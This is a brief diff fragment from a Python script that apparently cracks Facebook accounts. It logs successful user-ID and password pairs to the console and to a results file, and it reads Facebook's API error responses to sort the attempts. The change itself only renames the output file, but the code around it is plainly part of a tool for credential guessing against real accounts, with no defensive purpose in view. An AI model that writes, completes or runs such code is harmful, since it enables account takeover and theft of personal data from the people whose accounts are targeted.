@@ -1334,7 +1334,7 @@ class Main:
 				print("\r \033[0;92m[SAADAT!-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2011-2023-SAADAT!-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2011-2023-Saadat!-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;93m[SaadatT!-OK] %s | %s\033[0;97m         "%(uid, pw))
